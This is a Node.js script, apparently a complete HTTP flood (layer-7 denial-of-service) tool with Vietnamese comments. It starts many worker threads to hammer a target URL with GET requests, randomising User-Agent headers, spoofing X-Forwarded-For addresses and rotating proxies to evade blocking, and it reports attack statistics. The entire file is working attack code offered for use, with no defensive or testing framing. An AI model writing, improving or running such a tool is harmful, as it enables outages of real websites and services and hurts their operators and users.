#!/usr/bin/env node

const axios = require('axios');
const { program } = require('commander');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const userAgents = require('user-agents');
const ProxyManager = require('./proxy-manager');
const os = require('os');

// Cấu hình chương trình
program
    .name('ddos-layer7')
    .description('DDoS Layer 7 Attack Tool (JavaScript Version)')
    .argument('<url>', 'Target URL (e.g., http://example.com)')
    .option('-t, --threads <number>', 'Number of threads', '100')
    .option('-d, --duration <number>', 'Attack duration in seconds', '60')
    .option('-p, --proxy <url>', 'Proxy URL (optional)')
    .option('-u, --update-proxies', 'Update proxy list before attack')
    .option('-r, --rate <number>', 'Requests per second per thread', '10')
    .option('--no-ssl-verify', 'Disable SSL verification')
    .parse(process.argv);

const options = program.opts();
const targetUrl = program.args[0];

// Kiểm tra URL hợp lệ
if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
    console.error('[!] Error: Target URL must start with http:// or https://');
    process.exit(1);
}

// Kiểm tra memory usage
const checkMemoryUsage = () => {
    const used = process.memoryUsage();
    const memoryUsage = {
        rss: `${Math.round(used.rss / 1024 / 1024)}MB`,
        heapTotal: `${Math.round(used.heapTotal / 1024 / 1024)}MB`,
        heapUsed: `${Math.round(used.heapUsed / 1024 / 1024)}MB`
    };
    console.log('\n[*] Memory Usage:', memoryUsage);
};

// Class chính cho tấn công
class DDoSLayer7 {
    constructor(targetUrl, numThreads, duration, proxyManager = null) {
        this.targetUrl = targetUrl;
        this.numThreads = parseInt(numThreads);
        this.duration = parseInt(duration);
        this.proxyManager = proxyManager;
        this.successfulRequests = 0;
        this.failedRequests = 0;
        this.startTime = null;
        this.stopFlag = false;
        this.rateLimit = parseInt(options.rate) || 10;
        this.lastRequestTime = Date.now();
    }

    // Tạo headers ngẫu nhiên
    generateHeaders() {
        const userAgent = new userAgents();
        return {
            'User-Agent': userAgent.toString(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
        };
    }

    // Rate limiting
    async rateLimitDelay() {
        const now = Date.now();
        const timeSinceLastRequest = now - this.lastRequestTime;
        const minDelay = 1000 / this.rateLimit;
        
        if (timeSinceLastRequest < minDelay) {
            await new Promise(resolve => setTimeout(resolve, minDelay - timeSinceLastRequest));
        }
        this.lastRequestTime = Date.now();
    }

    // Thực hiện tấn công
    async attack() {
        while (!this.stopFlag) {
            try {
                await this.rateLimitDelay();

                const config = {
                    headers: this.generateHeaders(),
                    timeout: 5000,
                    validateStatus: false,
                    httpsAgent: options.sslVerify ? undefined : new (require('https').Agent)({ rejectUnauthorized: false })
                };

                // Sử dụng proxy ngẫu nhiên nếu có
                if (this.proxyManager) {
                    const proxy = this.proxyManager.getRandomProxy();
                    if (proxy) {
                        const [host, port] = proxy.split(':');
                        config.proxy = {
                            host,
                            port,
                            protocol: 'http'
                        };
                    }
                }

                const response = await axios.get(this.targetUrl, config);
                if (response.status === 200) {
                    this.successfulRequests++;
                } else {
                    this.failedRequests++;
                }
            } catch (error) {
                this.failedRequests++;
                if (error.code === 'ECONNREFUSED' || error.code === 'ETIMEDOUT') {
                    await new Promise(resolve => setTimeout(resolve, 1000)); // Delay on connection errors
                }
            }
        }
    }

    // Khởi động tấn công
    async start() {
        console.log(`[*] Starting DDoS Layer 7 attack on ${this.targetUrl}`);
        console.log(`[*] Number of threads: ${this.numThreads}`);
        console.log(`[*] Duration: ${this.duration} seconds`);
        console.log(`[*] Rate limit: ${this.rateLimit} requests/second/thread`);
        console.log(`[*] CPU Cores: ${os.cpus().length}`);
        if (this.proxyManager) {
            console.log(`[*] Using proxy rotation`);
        }

        this.startTime = Date.now();
        this.stopFlag = false;

        // Tạo workers
        const workers = [];
        for (let i = 0; i < this.numThreads; i++) {
            const worker = new Worker(__filename, {
                workerData: {
                    targetUrl: this.targetUrl,
                    proxyManager: this.proxyManager ? true : false,
                    rateLimit: this.rateLimit
                }
            });
            workers.push(worker);
        }

        // Hiển thị thống kê
        const statsInterval = setInterval(() => {
            const elapsed = (Date.now() - this.startTime) / 1000;
            const requestsPerSecond = (this.successfulRequests + this.failedRequests) / elapsed;
            process.stdout.write(`\r[*] Attack in progress... Time elapsed: ${elapsed.toFixed(1)}s | ` +
                `Successful: ${this.successfulRequests} | ` +
                `Failed: ${this.failedRequests} | ` +
                `RPS: ${requestsPerSecond.toFixed(1)}`);
        }, 1000);

        // Kiểm tra memory mỗi 30 giây
        const memoryInterval = setInterval(checkMemoryUsage, 30000);

        // Xử lý dừng tấn công
        process.on('SIGINT', () => {
            console.log('\n[!] Attack stopped by user');
            this.stop();
        });

        // Tự động dừng sau khoảng thời gian
        setTimeout(() => {
            this.stop();
        }, this.duration * 1000);

        // Đợi tất cả workers hoàn thành
        await Promise.all(workers.map(worker => new Promise(resolve => {
            worker.on('exit', resolve);
        })));

        clearInterval(statsInterval);
        clearInterval(memoryInterval);
        this.printStats();
    }

    // Dừng tấn công
    stop() {
        this.stopFlag = true;
    }

    // In thống kê
    printStats() {
        const totalTime = (Date.now() - this.startTime) / 1000;
        const totalRequests = this.successfulRequests + this.failedRequests;
        const requestsPerSecond = totalRequests / totalTime;

        console.log('\n[*] Attack completed');
        console.log(`[*] Total time: ${totalTime.toFixed(1)} seconds`);
        console.log(`[*] Total successful requests: ${this.successfulRequests}`);
        console.log(`[*] Total failed requests: ${this.failedRequests}`);
        console.log(`[*] Total requests: ${totalRequests}`);
        console.log(`[*] Average RPS: ${requestsPerSecond.toFixed(1)}`);
        checkMemoryUsage();
    }
}

// Worker thread
if (!isMainThread) {
    const { targetUrl, proxyManager, rateLimit } = workerData;
    const attacker = new DDoSLayer7(
        targetUrl,
        1,
        Infinity,
        proxyManager ? new ProxyManager() : null
    );
    attacker.rateLimit = rateLimit;
    attacker.attack();
}

// Main thread
if (isMainThread) {
    async function main() {
        let proxyManager = null;

        // Cập nhật danh sách proxy nếu được yêu cầu
        if (options.updateProxies) {
            console.log('[*] Updating proxy list...');
            proxyManager = new ProxyManager();
            await proxyManager.updateProxies();
        } else {
            // Hoặc sử dụng danh sách proxy hiện có
            proxyManager = new ProxyManager();
            proxyManager.loadProxies();
        }

        const attacker = new DDoSLayer7(
            targetUrl,
            options.threads,
            options.duration,
            proxyManager
        );
        await attacker.start();
    }

    main().catch(console.error);
}
